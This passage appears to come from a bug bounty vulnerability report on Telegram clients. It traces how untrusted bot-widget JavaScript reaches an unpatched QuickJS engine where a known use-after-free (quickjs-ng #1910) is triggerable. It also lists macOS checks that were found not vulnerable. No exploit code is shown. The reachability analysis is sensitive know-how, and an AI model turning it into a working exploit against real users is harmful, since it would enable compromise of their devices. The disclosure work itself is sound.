  pinned @ b526a817f188ef861eea7666d68361c7851673a0   ← ТОТ ЖЕ коммит, где воспроизведён UAF
```

**Desktop** (`packages/desktop/sandbox/src/`):
```
sandbox_engine.cpp:902  callTw("nextScript")                       // тянем inline-script виджета
sandbox_engine.cpp:914  evalScript(code->asString(), "inline-script-N.js", asModule)
sandbox_engine.cpp:897  js_->evaluate(code, filename, asModule)
quickjs_context.cpp:144 qjs_eval(context_, code.c_str(), code.size(), filename, asModule)  // сырой JS_Eval
```

**iOS** (`packages/ios/Sources/CQuickJS/shim/qjs_shim.c:35`):
```c
JSValue qjs_eval(JSContext *ctx, const char *code, size_t len, const char *filename, bool as_module) {
    return JS_Eval(ctx, code, len, filename, as_module ? JS_EVAL_TYPE_MODULE : JS_EVAL_TYPE_GLOBAL);
}
```

**Android** (`packages/android/.../SandboxEngine.kt`):
```
SandboxEngine.kt:962  callTw("nextScript")
SandboxEngine.kt:953  ctx.evaluate(code, filename, asModule)        // JNI → native JS_Eval
```

**Нет source-фильтра + eval явно разрешён.** `profile.json` декларирует `js.eval` ("eval / new Function
inside QuickJS", status **"in"**, :3943) и `js.microtasks` (Promise/async, "in", :3830). Единственный
входной фильтр в `pumpScripts` — пропуск `src`-скриптов (внешние не грузятся); inline-`code` исполняется
сырым. То есть даже при гипотетическом статическом subset-фильтре `eval("function* g(){…}")` обошёл бы
его. Генераторы — стандартная фича без блока → PoC #1910 исполняется дословно из бот-виджета.

### Остаётся подтвердить только степень RCE (не reachability)

- **Изоляция widget-sandbox-потока/процесса на iOS/Android**: QuickJS крутится «on its own thread»
  (README). Нужно определить, изолирован ли этот поток в отдельном процессе (тогда UAF контейнится
  в sandbox-child) или делит адресное пространство с хостом. На Desktop (Win/Lin) sandbox процесса нет
  → UAF в engine-потоке напрямую в адресном пространстве Telegram.
- Контролируемая эксплуатация (heap-spray → контроль указателя) **не выполнялась** — репорт покрывает
  reachability и сам UAF-примитив.

---

### Комментарий по bug bounty

Сам баг — upstream (quickjs-ng #1910, публичный). Telegram-специфичная **новизна** — факт что их форк
не получил патч, а нативный движок исполняет **недоверенный JS бот-виджетов** с полным доступом к
heap. По правилам программы может попасть под исключение «flawed open-source software version» — но
даже тогда **exposure** (нативный движок + недоверенный бот-JS) является Telegram-специфичным вектором
и заслуживает отдельного репорта. Рекомендуется репортнуть в любом случае: Telegram поддерживает форк
и должен применить патч.

**Артефакты (в репозитории):**  
`docs/poc-harness/quickjs-uaf/poc.js` — PoC-скрипт  
`docs/poc-harness/quickjs-uaf/asan-output.txt` — ASan-вывод на Telegram-форке  
`docs/poc-harness/quickjs-uaf/README.md` — подробная документация

---

## Out of Scope / Not Reproduced on macOS

- **SmartGlocal URL suffix bypass** — macOS uses HOST-based validation (`host.hasSuffix(".smart-glocal.com")`), unlike Desktop/Android which used path-based suffix. **Not vulnerable.**
- **Sparkle update integrity** — `InternalUpdaterDownloader` subclasses `SPUDownloaderSession` and delivers the binary via MTProto, then calls `urlSession(_:downloadTask:didFinishDownloadingTo:)`. Sparkle's EdDSA signature verification (via `SUPublicEdDSAKey` hardcoded in `Info.plist`) runs AFTER the download regardless of delivery path. **Not vulnerable**: a compromised MTProto channel cannot push unsigned updates because the public key is compiled into the app bundle.
